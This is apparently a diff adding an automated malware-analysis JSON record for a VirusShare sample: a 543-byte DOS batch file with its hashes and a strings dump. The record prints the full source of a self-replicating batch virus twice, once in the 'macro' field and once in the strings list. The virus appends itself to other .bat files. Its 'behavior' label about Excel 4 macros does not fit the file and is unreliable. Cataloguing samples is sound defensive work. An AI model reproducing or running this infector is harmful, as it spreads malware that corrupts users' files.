@@ -1,0 +1,46 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off>nul.ViR                      \nif '%1=='InF goto ViR_inf              \nif exist c:\\vir.bat goto ViR_run       \nif not exist %0.bat goto ViR_end       \nfind \"ViR\"<%0.bat>c:\\vir.bat          \n:ViR_run                                   \nfor %%a in (*.bat) do call c:\\ViR InF %%a  \ngoto ViR_end                              \n:ViR_inf                               \nfind \"ViR\"<%2>nul                      \nif not errorlevel 1 goto ViR_end       \ntype c:\\ViR.bat>>%2                    \n:ViR_end                               "
+    },
+    "filename": "VirusShare_0333c5d28cdcb0e00c71e0563eccc5d4",
+    "filesize": 543,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0333c5d28cdcb0e00c71e0563eccc5d4",
+        "sha1": "8f89e779ed9c0f3cc010a13970cbf2b47174b313",
+        "sha256": "2b6e2a1e187d185dadba0874aea98787963de7842c43c667cc32431b465b559f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off>nul.ViR                      ",
+            "if '%1=='InF goto ViR_inf              ",
+            "if exist c:\\vir.bat goto ViR_run       ",
+            "if not exist %0.bat goto ViR_end       ",
+            "find \"ViR\"<%0.bat>c:\\vir.bat          ",
+            ":ViR_run                                   ",
+            "for %%a in (*.bat) do call c:\\ViR InF %%a  ",
+            "goto ViR_end                              ",
+            ":ViR_inf                               ",
+            "find \"ViR\"<%2>nul                      ",
+            "if not errorlevel 1 goto ViR_end       ",
+            "type c:\\ViR.bat>>%2                    ",
+            ":ViR_end                               "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.258031",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
